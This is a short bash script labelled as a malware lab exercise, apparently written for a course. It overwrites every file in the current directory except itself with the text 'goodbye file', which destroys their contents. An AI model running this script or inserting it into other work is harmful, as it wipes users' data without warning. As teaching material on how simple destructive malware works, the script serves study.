#! /usr/bin/env bash

# Lab 7: Malware
# Goal: overwrite files

# Grab every file except malware script
#ls | grep -Ev "script.sh"

# Load files into an array
filearray=($(ls | grep -Ev "script.sh"))

# Loop through file array and overwrite files
for key in ${!filearray[@]}
do
	echo "goodbye file" > ${filearray[$key]}
done
